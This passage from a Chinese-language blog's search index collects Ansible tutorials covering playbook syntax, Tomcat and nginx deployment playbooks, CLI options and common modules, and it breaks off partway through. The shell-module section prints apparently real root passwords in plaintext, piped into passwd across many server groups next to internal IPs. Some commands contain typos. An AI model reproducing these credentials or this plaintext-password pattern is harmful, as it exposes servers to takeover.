O_NONBLOCK\\r\\nConnection to 10.212.52.252 closed.\\r\\nTransferred: sent 1928, received 3920 bytes, in 0.1 seconds\\r\\nBytes per second: sent 37017.0, received 75262.7\\r\\ndebug1: Exit status 0\\r\\ndebug1: compress outgoing: raw data 537, compressed 375, factor 0.70\\r\\ndebug1: compress incoming: raw data 1837, compressed 1019, factor 0.55\\r\\n\", \"stdout\": \"Filesystem Size Used Avail Use% Mounted on\\r\\n/dev/sda2 9.9G 872M 8.5G 10% /\\r\\nudev 3.9G 128K 3.9G 1% /dev\\r\\ntmpfs 3.9G 76K 3.9G 1% /dev/shm\\r\\n/dev/sda3 5.0G 219M 4.5G 5% /boot\\r\\n/dev/sda8 40G 15G 23G 40% /home\\r\\n/dev/sda9 9.9G 5.2G 4.3G 55% /opt\\r\\n/dev/sda6 5.0G 2.7G 2.1G 57% /tmp\\r\\n/dev/sda5 9.9G 3.4G 6.0G 36% /usr\\r\\n/dev/sda7 9.9G 823M 8.6G 9% /var\\r\\neth0 Link encap:Ethernet HWaddr 00:50:56:A8:65:7E \\r\\n inet addr:10.212.52.252 Bcast:10.212.52.255 Mask:255.255.255.0\\r\\n inet6 addr: fe80::250:56ff:fea8:657e/64 Scope:Link\\r\\n UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1\\r\\n RX packets:24112135 errors:0 dropped:792372 overruns:0 frame:0\\r\\n TX packets:10697339 errors:0 dropped:0 overruns:0 carrier:0\\r\\n collisions:0 txqueuelen:1000 \\r\\n RX bytes:17137233328 (16343.3 Mb) TX bytes:13390377826 (12770.0 Mb)\\r\\n\\r\\nlo Link encap:Local Loopback \\r\\n inet addr:127.0.0.1 Mask:255.0.0.0\\r\\n inet6 addr: ::1/128 Scope:Host\\r\\n UP LOOPBACK RUNNING MTU:16436 Metric:1\\r\\n RX packets:3407332 errors:0 dropped:0 overruns:0 frame:0\\r\\n TX packets:3407332 errors:0 dropped:0 overruns:0 carrier:0\\r\\n collisions:0 txqueuelen:0 \\r\\n RX bytes:262675450 (250.5 Mb) TX bytes:262675450 (250.5 Mb)\\r\\n\\r\\nroot 25332 0.0 0.0 4260 568 pts/2 S+ 12:54 0:00 \\\\_ grep snmp\\r\\nroot 24364 0.0 0.0 70416 6696 ? SNl May15 0:22 /usr/sbin/snmpd -r -A -LF i /var/log/net-snmpd.log -p /var/run/snmpd.pid\\r\\n\"&#125; 输出结果很多，看起来也很乱，不过查下stdout部分，这个部分是实际上执行后的结果。这里可以配合管道一起使用，可以如下使用： ` [root@361way ~]# ansible 10.212.52.252 -m script -a &#39;script.sh&#39; |egrep &#39;&gt;&gt;|stdout&#39;","link":"/2016/03/09/自动化+Jenkins/Ansible/Ansible小结（四）Ad-hoc与commands模块 /"},{"title":"Ansible-Playbook高级语法运用","text":"Ansible 官网学习：免费下载的ANSIBLE WHITEPAPER ansible高级白皮书 Ansible简介, 111分钟的学习视频官网 Ansible自动化平台演示,演示 我在官网学习📚书籍 ，这里也是官网推荐我贴了3本，需要自己去下载： Ansible for DevOps, by Jeff GeerlingFREE BOOK SAMPLE Extending Ansible eBook Preview , Extending Ansible ,by Rishabh DasFREE BOOK SAMPLE Mastering Ansible ebook , Mastering Ansible , by Jesse KeatingFREE BOOK SAMPLE 这里我主要应用到Ansible-Playbook 比较多，一开始学ansible是因为运维这块需要用到自动化，以前自动化发布等等都是用shell,python复杂性的去完成，shell去实现部署一个环境，要完成多台机器之前采用，salt去实现效果，发现在公司一个大型的架构演变salt支撑不了，而且需要网络稳定性高，他们的自动化控制是用agent去控制的，需要控制的机器都要修改和配置安装agent,ansbile就不需要。 在Ansible中，我们就充当编剧的角色，亲自编写剧本（一系列的服务器操作），让一出出精彩的戏剧（play）巧妙配合，完成对服务器的一系列精确控制。 1.1 Playbook语法简介Playbook采用一种可读性很高的且容易被人类阅读的语法的YAML语法编写，YAML: &quot;YAML Ain&#39;t a Markup Language&quot;（YAML不是一种置标语言）。该语言在被开发时，YAML 的意思其实是：”Yet Another Markup Language”（仍是一种置标语言），格式如下所示： 123456789101112131415house: family: name: Doe parents: - John - Jane children: - Paul - Mark - Simone address: number: 34 street: Main Street city: Nowheretown zipcode: 12345 这里语法报错有的如果按shell脚本直接去写的话就会出错： 报错： [WARNING]: Consider using unarchive module rather than running unzip 12345678910111213141516171819[root@ansible_01 ~]# ansible-playbook famly.yml---PLAY [all] *********************************************************************TASK [setup] *******************************************************************ok: [192.168.1.209]TASK [copy-war-file] ***********************************************************ok: [192.168.1.209]TASK [unzip war.] **************************************************************changed: [192.168.1.209] [WARNING]: Consider using unarchive module rather than running unzipPLAY RECAP *********************************************************************192.168.1.209 : ok=3 changed=1 unreachable=0 failed=0 原这里famly.yml写这里解压步骤： 12- name : 解压/root/java_war/api.war包在/home/app/newwar/api目录 shell : unzip -oq &#123;&#123; famly_war &#125;&#125; -d &#123;&#123; app_war &#125;&#125;/webapps/ 修改以后： 12- name: unzip war. unarchive: src=/root/java_war/haozhuo-family.war dest=/srv/ 经过以上更改后，软件包可以正常在client解压，不再报错。 2、特点YAML的可读性好 YAML和脚本语言的交互性好 YAML使用实现语言的数据类型 YAML有一个一致的信息模型 YAML易于实现 YAML可以基于流来处理 YAML表达能力强，扩展性好 YAML的语法和其他高阶语言类似，并且可以简单表达清单、散列表、标量等数据结构。其结构（Structure）通过空格来展示，序列（Sequence）里的项用”-“来代表，Map里的键值对用”:”分隔。下面是一个示例。 123456789101112131415161718- hosts: 10.1.0.1 #定义主机 vars: #定义变量 var1: value var2: value tasks: #定义任务 - name: #任务名称。 #这里就可以开始用模块来执行具体的任务了。 handlers: #定义触发通知所作的操作。里面也是跟tasks一样，用模块定义任务。 - name: remote_user: #远程主机执行任务时的用户。一般都是root，一般也不用指定。- hosts: web vars: tasks: handlers: remote_user: YAML文件扩展名通常为.yaml，如family.yaml 2.playbook的基础组件：12345678Hosts：运行指定任务的目标主机；remote_user：在远程主机以哪个用户身份执行； sudo_user：非管理员需要拥有sudo权限；tasks：任务列表 模块，模块参数： 格式： (1) action: module arguments (2) module: arguments 示例1： vim test.yaml 也可以是 .yml 123456789101112131415161718- hosts: tomcat_01 #运行指定任务的目标主机； remote_user: root #在远程主机以哪个用户身份执行；root tasks: - name: install a group group: name=mygrp system=true - name: install a user user: name=user1 group=mygrp system=true # 这里-name: graoup: 都要对齐，不然会提示语法出错。 - hosts: websrvs remote_user: root tasks: - name: install httpd package yum: name=httpd - name: start httpd service service: name=httpd state=started 3.运行playbook，使用ansible-playbook命令(1)检测语法 1ansible-playbook –syntax-check /path/to/playbook.yaml (2)测试运行 12345ansible-playbook -C /path/to/playbook.yaml --list-hosts --list-tasks --list-tags 这里简单结合shell演变写安装nginx: 123456789101112131415161718- name: copy nginx package copy: src=nginx-1.10.0-1.el7.ngx.x86_64.rpm dest=/tmp/nginx-1.10.0-1.el7.ngx.x86_64.rpm- name: install nginx package yum: name=/tmp/nginx-1.10.0-1.el7.ngx.x86_64.rpm state=present- name: install nginx.conf file template: src=nginx.conf.j2 dest=/etc/nginx/nginx.conf tags: ngxconf notify: reload nginx service- name: install default.conf file template: src=default.conf.j2 dest=/etc/nginx/conf.d/default.conf tags: ngxconf notify: reload nginx service- name: start nginx service service: name=nginx enabled=true state=started 自动化部署Tomcat服务。 123456789101112131415161718192021222324252627282930313233343536---- hosts: all environment: LC_ALL: zh_CN.UTF-8 LANG : zh_CN.UTF-8 vars:#jenkins-打包目录 TESTWAR: /root/java_war/haozhuo-family.war#生产环境中项目的tomcat所在的位置 OLDHOME: /srv/tomcat/tomcat_family/webapps/ROOT#生产环境中老版本项目所在webapps备份目录的位置 backupwebapps: /srv/tomcat/tomcat_family/warbackup#从jenkins-打包环境获取的新版本war包所在的位置 NEWWAR: /root/java_war/#生产环境中项目war包的名字 WARNAME: haozhuo-family.war#kill服务type路径 DOWNFILE: /srv/tomcat/tomcat_family tasks: - name: copy-war-file copy: src=&#123;&#123; TESTWAR &#125;&#125; dest=&#123;&#123; NEWWAR &#125;&#125; - name: mkdir-bakwar-file file: path=&#123;&#123; backupwebapps &#125;&#125; state=directory owner=tomcat group=tomcat mode=755 - name: bakwar-file shell: \"cp -r &#123;&#123; OLDHOME &#125;&#125; &#123;&#123; backupwebapps &#125;&#125;\" - name: unzip war. unarchive: src=&#123;&#123; NEWWAR &#125;&#125;/&#123;&#123; WARNAME &#125;&#125; dest=&#123;&#123; OLDHOME &#125;&#125; - name: stop-tomcat-service shell: \"ps -ef |grep &#123;&#123; DOWNFILE &#125;&#125; |grep -v grep |awk '&#123;print $2&#125;' |xargs kill -9\" ignore_errors: yes async: 0 - name: start-tomcat-service-nohup shell: chdir=&#123;&#123; DOWNFILE &#125;&#125;/bin nohup ./startup.sh &amp; 123456789101112131415161718192021# tree /etc/ansible/.├── ansible.cfg├── group_vars # here we assign variables to particular groups│ └── tomcat-servers # this filename must the same with the group in the 'hosts'├── hosts├── roles│ ├── selinux│ └── tomcat│ ├── files│ │ └── tomcat-initscript.sh # &lt;-- script files for use with the script resource│ ├── handlers│ │ └── main.yml # &lt;-- handlers file│ ├── tasks│ │ └── main.yml # &lt;-- tasks file can include smaller files if warranted│ └── templates # &lt;-- files for use with the template resource│ ├── iptables-save│ ├── server.xml│ └── tomcat-users.xml├── app2.retry└── app2.yml # master playbook","link":"/2017/02/10/自动化+Jenkins/Ansible/Ansible-Playbook高级语法运用/"},{"title":"Ansible 脚本(Playbook基本语法)远程控制","text":"ansible 脚本(Playbook基本语法)远程控制Playbook基本语法 本节列举了写第一个Playbook，你必须了解基本语法。随着你面临的机器越多，配属的需求越复杂，你可能需要了解后面介绍的一些稍微复杂逻辑语句。 执行Playbook语法 这里先 vim deploy.yml 12345678910111213141516171819deploy.yml文件---- hosts: tomcat_D1 vars: http_port: 80 max_clients: 200 user: root tasks: - name: ensure apache is at the latest version yum: name=httpd state=latest - name: write the apache config file template: src=/srv/httpd.j2 dest=/etc/httpd.conf notify: - restart apache - name: start httpd service: name=httpd state=started handlers: - name: restart apache service: name=httpd state=restarted 执行Playbook语法1$ ansible-playbook deploy.yml 查看输出的细节 1 1ansible-playbook playbook.yml --list-hosts 查看该脚本影响哪些hosts 1ansible-playbook playbook.yml --list-hosts 并行执行脚本 1ansible-playbook playbook.yml -f 10 完整的playbook脚本示例123456789最基本的playbook脚本分为三个部分:在什么机器上以什么身份执行hostsusers...执行的任务是都有什么tasks善后的任务都有什么handlers 这里我写了个tomcat发布，yml文件：参考： 12345678910111213141516- hosts: tomcat-system_01 environment: LC_ALL: zh_CN.UTF-8 LANG : zh_CN.UTF-8 tasks: - name : cpfile-system copy : src=/root/.jenkins/workspace/yjk_master/haozhuo/haozhuo-system/target/haozhuo-system.war dest=/root/java_war/haozhuo-system.war - name : restart shell : /root/update/system.sh async : 0 - name : shutdown shell : /srv/tomcat/tomcat_system/bin/shutdown.sh async : 0 - name : start shell : chdir=/srv/tomcat/tomcat_system/bin nohup ./startup.sh &amp; async : 0 参考官网：https://ansible-book.gitbooks.io/ansible-first-book/content/playbookji_ben_yu_fa.html","link":"/2016/03/10/自动化+Jenkins/Ansible/ansible 脚本(Playbook基本语法)远程控制/"},{"title":"Ansible小结（二）ansible架构","text":"Ansible 是一个模型驱动的配置管理器，支持多节点发布、远程任务执行。默认使用 SSH 进行远程连接。无需在被管理节点上安装附加软件，可使用各种编程语言进行扩展。 上图为ansible的基本架构，从上图可以了解到其由以下部分组成： 1234567核心：ansible核心模块（Core Modules）：这些都是ansible自带的模块 扩展模块（Custom Modules）：如果核心模块不足以完成某种功能，可以添加扩展模块插件（Plugins）：完成模块功能的补充剧本（Playbooks）：ansible的任务配置文件，将多个任务定义在剧本中，由ansible自动执行连接插件（Connectior Plugins）：ansible基于连接插件连接到各个主机上，虽然ansible是使用ssh连接到各个主机的，但是它还支持其他的连接方法，所以需要有连接插件主机群（Host Inventory）：定义ansible管理的主机 二、ansible工作原理 12345 1、管理端支持local 、ssh、zeromq 三种方式连接被管理端，默认使用基于ssh的连接－－－这部分对应基本架构图中的连接模块；2、可以按应用类型等方式进行Host Inventory（主机群）分类，管理节点通过各类模块实现相应的操作－－－单个模块，单条命令的批量执行，我们可以称之为ad-hoc；3、管理节点可以通过playbooks 实现多个task的集合实现一类功能，如web服务的安装部署、数据库服务器的批量备份等。playbooks我们可以简单的理解为，系统通过组合多条ad-hoc操作的配置文件 。 三、ansible的七个命令安装完ansible后，发现ansible一共为我们提供了七个指令： 1234567ansibleansible-docansible-galaxyansible-lintansible-playbookansible-pullansible-vault 这里我们只查看usage部分，详细部分可以通过 “指令 -h” 的方式获取。 1、ansible123456789101112131415161718192021222324252627282930313233343536373839404142[root@docker ~]# ansible -hUsage: ansible &lt;host-pattern&gt; [options]参数： -a 'Arguments', --args='Arguments' 命令行参数 -m NAME, --module-name=NAME 执行模块的名字，默认使用 command 模块，所以如果是只执行单一命令可以不用 -m参数 -i PATH, --inventory=PATH 指定库存主机文件的路径,默认为/etc/ansible/hosts. -u Username， --user=Username 执行用户，使用这个远程用户名而不是当前用户 -U --sud-user=SUDO_User sudo到哪个用户，默认为 root -k --ask-pass 登录密码，提示输入SSH密码而不是假设基于密钥的验证 -K --ask-sudo-pass 提示密码使用sudo -s --sudo sudo运行 -S --su 用 su 命令 -l --list 显示所支持的所有模块 -s --snippet 指定模块显示剧本片段 -f --forks=NUM 并行任务数。NUM被指定为一个整数,默认是5。 #ansible testhosts -a \"/sbin/reboot\" -f 10 重启testhosts组的所有机器，每次重启10台 --private-key=PRIVATE_KEY_FILE 私钥路径，使用这个文件来验证连接 -v --verbose 详细信息 all 针对hosts 定义的所有主机执行 -M MODULE_PATH, --module-path=MODULE_PATH 要执行的模块的路径，默认为/usr/share/ansible/ --list-hosts 只打印有哪些主机会执行这个 playbook 文件，不是实际执行该 playbook 文件 -o --one-line 压缩输出，摘要输出.尝试一切都在一行上输出。 -t Directory, --tree=Directory 将内容保存在该输出目录,结果保存在一个文件中在每台主机上。 -B 后台运行超时时间 -P 调查后台程序时间 -T Seconds, --timeout=Seconds 时间，单位秒s -P NUM, --poll=NUM 调查背景工作每隔数秒。需要- b -c Connection, --connection=Connection 连接类型使用。可能的选项是paramiko(SSH),SSH和地方。当地主要是用于crontab或启动。 --tags=TAGS 只执行指定标签的任务 例子:ansible-playbook test.yml --tags=copy 只执行标签为copy的那个任务 --list-hosts 只打印有哪些主机会执行这个 playbook 文件，不是实际执行该 playbook 文件 --list-tasks 列出所有将被执行的任务 -C, --check 只是测试一下会改变什么内容，不会真正去执行;相反,试图预测一些可能发生的变化 --syntax-check 执行语法检查的剧本,但不执行它 -l SUBSET, --limit=SUBSET 进一步限制所选主机/组模式 --limit=192.168.0.15 只对这个ip执行 --skip-tags=SKIP_TAGS 只运行戏剧和任务不匹配这些值的标签 --skip-tags=copy_start -e EXTRA_VARS, --extra-vars=EXTRA_VARS 额外的变量设置为键=值或YAML / JSON #cat update.yml --- - hosts: &#123;&#123; hosts &#125;&#125; remote_user: &#123;&#123; user &#125;&#125; .............. #ansible-playbook update.yml --extra-vars \"hosts=vipers user=admin\" 传递&#123;&#123;hosts&#125;&#125;、&#123;&#123;user&#125;&#125;变量,hosts可以是 ip或组名 -l,--limit 对指定的 主机/组 执行任务 --limit=192.168.0.10，192.168.0.11 或 -l 192.168.0.10，192.168.0.11 只对这个2个ip执行任务 2、ansible-doc123456789101112[root@docker ~]# ansible-doc -hUsage: ansible-doc [options] [module...]Options: -h, --help show this help message and exit -l, --list List available modules -M MODULE_PATH, --module-path=MODULE_PATH specify path(s) to module library (default=None) -s, --snippet Show playbook snippet for specified module(s) -v, --verbose verbose mode (-vvv for more, -vvvv to enable connection debugging) --version show program's version number and exit 该指令用于查看模块信息，常用参数有两个-l 和 -s ，具体如下： 1234//列出所有已安装的模块# ansible-doc -l//查看具体某模块的用法，这里如查看command模块# ansible-doc -s command 3、ansible-galaxy12345678[root@docker ~]# ansible-galaxy -hUsage: ansible-galaxy [delete|import|info|init|install|list|login|remove|search|setup] [--help] [options] ...Options: -h, --help show this help message and exit -v, --verbose verbose mode (-vvv for more, -vvvv to enable connection debugging) --version show program's version number and exit ansible-galaxy 指令用于方便的从https://galaxy.ansible.com/ 站点下载第三方扩展模块，我们可以形象的理解其类似于centos下的yum、python下的pip或easy_install 。如下示例： 12345[root@localhost ~]# ansible-galaxy install aeriscloud.docker- downloading role 'docker', owned by aeriscloud- downloading role from https://github.com/AerisCloud/ansible-docker/archive/v1.0.0.tar.gz- extracting aeriscloud.docker to /etc/ansible/roles/aeriscloud.docker- aeriscloud.docker was installed successfully 这个安装了一个aeriscloud.docker组件，前面aeriscloud是galaxy上创建该模块的用户名，后面对应的是其模块。在实际应用中也可以指定txt或yml 文件进行多个组件的下载安装。这部分可以参看官方文档。 这个安装了一个aeriscloud.docker组件，前面aeriscloud是galaxy上创建该模块的用户名，后面对应的是其模块。在实际应用中也可以指定txt或yml 文件进行多个组件的下载安装。这部分可以参看官方文档。 4、ansible-lintansible-lint是对playbook的语法进行检查的一个工具。用法是ansible-lint playbook.yml 。 5、ansible-playbook该指令是使用最多的指令，其通过读取playbook 文件后，执行相应的动作，这个后面会做为一个重点来讲。 6、ansible-pull该指令使用需要谈到ansible的另一种模式－－－pull 模式，这和我们平常经常用的push模式刚好相反，其适用于以下场景：你有数量巨大的机器需要配置，即使使用非常高的线程还是要花费很多时间；你要在一个没有网络连接的机器上运行Anisble，比如在启动之后安装。这部分也会单独做一节来讲。 7、ansible-vaultansible-vault主要应用于配置文件中含有敏感信息，又不希望他能被人看到，vault可以帮你加密/解密这个配置文件，属高级用法。主要对于playbooks里比如涉及到配置密码或其他变量时，可以通过该指令加密，这样我们通过cat看到的会是一个密码串类的文件，编辑的时候需要输入事先设定的密码才能打开。这种playbook文件在执行时，需要加上 –ask-vault-pass参数，同样需要输入密码后才能正常执行。具体该部分可以参查官方博客。 注：上面七个指令，用的最多的只有两个ansible 和ansible-playbook ，这两个一定要掌握，其他五个属于拓展或高级部分。","link":"/2016/03/07/自动化+Jenkins/Ansible/ansible小结（二）ansible架构 /"},{"title":"Ansible小结 (五) 常用模块","text":"ansible命令总结使用：在上一篇中介绍了commands部分模块，本篇承接上篇介绍下常用的模块。根据官方的分类，将模块按功能分类为： 1云模块、命令模块、数据库模块、文件模块、资产模块、消息模块、监控模块、网络模块、通知模块、包管理模块、源码控制模块、系统模块、单元模块、web设施模块、windows模块 具体可以参看官方页面 这里从官方分类的模块里选择最常用的一些模块进行介绍（commands模块上一篇已经介绍，这里不再提）。 一、ping模块测试主机是否是通的，用法很简单，不涉及参数：1234567ansible tomcat_B1 -m ping[root@ansible ~]# ansible tomcat_C1 -m ping192.168.1.177 | SUCCESS =&gt; &#123; \"changed\": false, \"ping\": \"pong\"&#125; 二、setup模块setup模块，主要用于获取主机信息，在playbooks里经常会用到的一个参数gather_facts就与该模块相关。setup模块下经常使用的一个参数是filter参数，具体使用示例如下（由于输出结果较多，这里只列命令不写结果）： 查看主机内存信息1[root@ansible ~]# ansible tomcat_C1 -m setup -a 'filter=ansible_*_mb' 查看地接口为eth0-2的网卡信息12[root@ansible ~]# ansible tomcat_C1 -m setup -a 'filter=ansible_eth[0-2]' [root@ansible ~]# ansible all -m setup --tree /tmp/facts //将所有主机的信息输入到/tmp/facts目录下，每台主机的信息输入到主机名文件中（/etc/ansible/hosts里的主机名） 三、file模块file模块主要用于远程主机上的文件操作，file模块包含如下选项： force：需要在两种情况下强制创建软链接，一种是源文件不存在但之后会建立的情况下；另一种是目标软链接已存在,需要先取消之前的软链，然后创建新的软链，有两个选项：yes|no group：定义文件/目录的属组 mode：定义文件/目录的权限 owner：定义文件/目录的属主 path：必选项，定义文件/目录的路径 recurse：递归的设置文件的属性，只对目录有效 src：要被链接的源文件的路径，只应用于state=link的情况 dest：被链接到的路径，只应用于state=link的情况 state： directory：如果目录不存在，创建目录 file：即使文件不存在，也不会被创建 link：创建软链接 hard：创建硬链接 touch：如果文件不存在，则会创建一个新的文件，如果文件或目录已存在，则更新其最后修改时间 absent：删除目录、文件或者取消链接文件使用示例： 1234ansible test -m file -a \"src=/etc/fstab dest=/tmp/fstab state=link\"ansible test -m file -a \"path=/tmp/fstab state=absent\"ansible test -m file -a \"path=/tmp/test state=touch\"ansible test -m file -a \"path=/tmp/test state=directory\" ansible test -m file -a \"path=/tmp/testd state=directory owner=root group=root mode=777\" 四、copy模块复制文件到远程主机，copy模块包含如下选项： backup：在覆盖之前将原文件备份，备份文件包含时间信息。有两个选项：yes|no content：用于替代”src”,可以直接设定指定文件的值 dest：必选项。要将源文件复制到的远程主机的绝对路径，如果源文件是一个目录，那么该路径也必须是个目录 directory_mode：递归的设定目录的权限，默认为系统默认权限 force：如果目标主机包含该文件，但内容不同，如果设置为yes，则强制覆盖，如果为no，则只有当目标主机的目标位置不存在该文件时，才复制。默认为yes others：所有的file模块里的选项都可以在这里使用 src：要复制到远程主机的文件在本地的地址，可以是绝对路径，也可以是相对路径。如果路径是一个目录，它将递归复制。在这种情况下，如果路径使用”/“来结尾，则只复制目录里的内容，如果没有使用”/“来结尾，则包含目录在内的整个内容全部复制，类似于rsync。 validate：The validation command to run before copying into place. The path to the file to validate is passed in via ‘%s’ which must be present as in the visudo example below. 示例如下： 123ansible test -m copy -a \"src=/srv/myfiles/foo.conf dest=/etc/foo.conf owner=foo group=foo mode=0644\"ansible test -m copy -a \"src=/mine/ntp.conf dest=/etc/ntp.conf owner=root group=root mode=644 backup=yes\"ansible test -m copy -a \"src=/mine/sudoers dest=/etc/sudoers validate='visudo -cf %s'\" 这里在举个例子： 目的：把主控端/opt/目录下面logstash.tar.gz文件拷贝到到指定节点上/srv/下面 命令：ansible cluster1:children -m copy -a &quot;src=/opt/logstash.tar.gz dest=/srv/. owner=root group=root mode=644&quot; 12345678910111213141516171819202122232425262728root@salt ~]# ansible cluster1:children -m copy -a \"src=/opt/logstash.tar.gz dest=/srv/. 10.47.59.190 | SUCCESS =&gt; &#123; \"changed\": true, \"checksum\": \"9d15ea324f39d08cb379f59ffee9fa7ad2a62ab8\", \"dest\": \"/srv/./logstash.tar.gz\", \"gid\": 0, \"group\": \"root\", \"md5sum\": \"c151602e79a336ca363928dea68d2567\", \"mode\": \"0644\", \"owner\": \"root\", \"size\": 84431108, \"src\": \"/root/.ansible/tmp/ansible-tmp-1483939085.93-201327709717575/source\", \"state\": \"file\", \"uid\": 0&#125;10.47.106.105 | SUCCESS =&gt; &#123; \"changed\": true, \"checksum\": \"9d15ea324f39d08cb379f59ffee9fa7ad2a62ab8\", \"dest\": \"/srv/./logstash.tar.gz\", \"gid\": 0, \"group\": \"root\", \"md5sum\": \"c151602e79a336ca363928dea68d2567\", \"mode\": \"0644\", \"owner\": \"root\", \"size\": 84431108, \"src\": \"/root/.ansible/tmp/ansible-tmp-1483939088.11-46151538408374/source\", \"state\": \"file\", \"uid\": 0&#125; 批量控制解压文件批量解压命令： ansible cluster1:children -m shell -a &quot;tar -zxvf /srv/logstash.tar.gz&quot; -C /srv/. 五、yum模块yum安装使用：使用yum包管理器来管理软件包，其选项有： config_file：yum的配置文件 disable_gpg_check：关闭gpg_check disablerepo：不启用某个源 enablerepo：启用某个源 name：要进行操作的软件包的名字，也可以传递一个url或者一个本地的rpm包的路径state：状态（present，absent，latest） 示例如下： 1ansible tomcat_D1 -s -m yum -a \"name=wget state=latest\" 12345678910111213141516[root@ansible playbook]# ansible tomcat_D1 -s -C -m yum -a \"name=kernel state=latest\"192.168.1.178 | SUCCESS =&gt; &#123; \"changed\": true, \"changes\": &#123; \"installed\": [], \"updated\": [ [ \"kernel\", \"2.6.32-642.4.2.el6.x86_64 from updates\" ] ] &#125;, \"msg\": \"\", \"rc\": 0, \"results\": []&#125; 六 service模块用于管理服务 该模块包含如下选项： arguments：给命令行提供一些选项 enabled：是否开机启动 yes|no name：必选项，服务名称 pattern：定义一个模式，如果通过status指令来查看服务的状态时，没有响应，就会通过ps指令在进程中根据该模式进行查找，如果匹配到，则认为该服务依然在运行 runlevel：运行级别 sleep：如果执行了restarted，在则stop和start之间沉睡几秒钟 state：对当前服务执行启动，停止、重启、重新加载等操作（started,stopped,restarted,reloaded） 示例如下： 1234ansible test -m service -a \"name=httpd state=started enabled=yes\" ansible test -m service -a \"name=foo pattern=/usr/bin/foo state=started\" ansible test -m service -a \"name=network state=restarted args=eth0\"ansible cluster2:children -m service -a \"name=logstash pattern=/etc/init.d/logstash state=started\" 参考：http://www.361way.com/ansible-modules/4415.html 七 shell 模块这里我写个例子： 批量更改组的机器的用户名密码。 12345678910111213141516[root@salt ansible]# ansible cluster1:children -m shell -a \"echo \"Ihaozhuo\" | passwd --stdin \"root\" \"10.43.59.190 | SUCCESS | rc=0 &gt;&gt;更改用户 root 的密码 。passwd： 所有的身份验证令牌已经成功更新。10.23.2.106 | SUCCESS | rc=0 &gt;&gt;更改用户 root 的密码 。passwd： 所有的身份验证令牌已经成功更新。10.23.232.85 | SUCCESS | rc=0 &gt;&gt;更改用户 root 的密码 。passwd： 所有的身份验证令牌已经成功更新。10.23.232.131 | SUCCESS | rc=0 &gt;&gt;更改用户 root 的密码 。passwd： 所有的身份验证令牌已经成功更新。 查看分组上机器所有端口： 123456789101112131415161718192021222324252627[root@salt ansible]# ansible zk1:children -m shell -a \"netstat -ntulp\"10.37.238.75 | SUCCESS | rc=0 &gt;&gt;Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:2181 0.0.0.0:* LISTEN 12497/javatcp 0 0 0.0.0.0:56521 0.0.0.0:* LISTEN 12497/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1251/sshdtcp 0 0 0.0.0.0:4888 0.0.0.0:* LISTEN 12497/javatcp 0 0 127.0.0.1:15770 0.0.0.0:* LISTEN 1434/aegis_quartzudp 0 0 118.178.240.129:123 0.0.0.0:* 1262/ntpdudp 0 0 10.27.238.75:123 0.0.0.0:* 1262/ntpdudp 0 0 127.0.0.1:123 0.0.0.0:* 1262/ntpdudp 0 0 0.0.0.0:123 0.0.0.0:* 1262/ntpd10.37.100.200 | SUCCESS | rc=0 &gt;&gt;Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:58367 0.0.0.0:* LISTEN 11232/javatcp 0 0 10.47.100.200:10050 0.0.0.0:* LISTEN 646/zabbix_agentdtcp 0 0 0.0.0.0:2181 0.0.0.0:* LISTEN 11232/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1243/sshdtcp 0 0 0.0.0.0:4888 0.0.0.0:* LISTEN 11232/javatcp 0 0 127.0.0.1:15770 0.0.0.0:* LISTEN 1436/aegis_quartzudp 0 0 120.27.152.77:123 0.0.0.0:* 1254/ntpdudp 0 0 10.47.100.200:123 0.0.0.0:* 1254/ntpdudp 0 0 127.0.0.1:123 0.0.0.0:* 1254/ntpdudp 0 0 0.0.0.0:123 0.0.0.0:* 1254/ntpd shell 模块 可以用的最多。查看目录执行文件等等。 ansible修改线上服务器上的密码 12345678910111213141516ansible cluster1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible cluster2:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible cluster3:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible zk1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible kafka1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible es1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible ihaozhuo1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible monitor1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \" 2、Ansible 总结举例常用模块学习12shell &gt; ansible-doc -l # 列出 Ansible 支持的模块shell &gt; ansible-doc ping # 查看该模块帮助信息 远程命令模块（ command / raw / script / shell ） command 作为 Ansible 的默认模块，可以运行远程权限范围所有的 shell 命令，不支持管道符。 例： 1shell &gt; ansible Client -m command -a \"free -m\" # 查看 Client 分组主机内存使用情况 raw模块 [类似于command模块、支持管道传递] 例： 1ansible Client -m raw -a \"ifconfig eth0 |sed -n 2p |awk '&#123;print \\$2&#125;' |awk -F: '&#123;print \\$2&#125;'\" script 的功能是在远程主机执行主控端存储的 shell 脚本文件，相当于 scp + shell 组合。 例： 1shell &gt; ansible Client -m script -a \"/home/test.sh 12 34\" # 远程执行本地脚本 shell 的功能是执行远程主机上的 shell 脚本文件，支持管道符。 例： 1shell &gt; ansible Client -m shell -a \"/home/test.sh\" # 执行远程脚本 copy 模块（实现主控端向目标主机拷贝文件，类似于 scp 功能） 例： 12shell &gt; ansible Client -m copy -a \"src=/home/test.sh desc=/tmp/ owner=root group=root mode=0755\" # 向 Client 组中主机拷贝 test.sh 到 /tmp 下，属主、组为 root ，权限为 0755 stat 模块（获取远程文件状态信息，atime/ctime/mtime/md5/uid/gid 等信息） 例： 1shell &gt; ansible Client -m stat -a \"path=/etc/syctl.conf\" get_url 模块（实现在远程主机下载指定 URL 到本地，支持 sha256sum 文件校验） 例： 1shell &gt; ansible Client -m get_utl -a \"url=http://www.baidu.com dest=/tmp/index.html mode=0440 force=yes\" yum 模块（软件包管理） 例： 1shell &gt; ansible Client -m yum -a \"name=curl state=latest\" cron 模块（远程主机 crontab 配置） 例： 123456shell &gt; ansible Client -m cron -a \"name='check dirs' hour='5,2' job='ls -alh &gt; /dev/null'\"效果：# Ansible: check dirs* 5,2 * * * ls -alh &gt; /dev/null mount 